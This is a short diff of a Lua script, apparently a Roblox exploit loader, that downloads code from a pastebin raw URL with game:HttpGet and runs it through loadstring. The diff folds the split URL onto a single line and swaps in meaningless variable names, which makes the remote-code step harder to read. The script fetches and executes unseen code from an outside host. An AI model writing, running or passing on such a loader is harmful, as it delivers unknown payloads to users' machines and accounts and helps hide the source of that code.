@@ -1,5 +1,1 @@
-p1 = "https://pastebin"
-p2 = ".com/raw/"
-p3 = "nBudpnPM"
-
-(loadstring or load)(game:HttpGet(p1..p2..p3))()
+local _="https://pastebin"local __=".com/raw/"local ___="nBudpnPM"(loadstring or load)(game:HttpGet(_..__..___))()
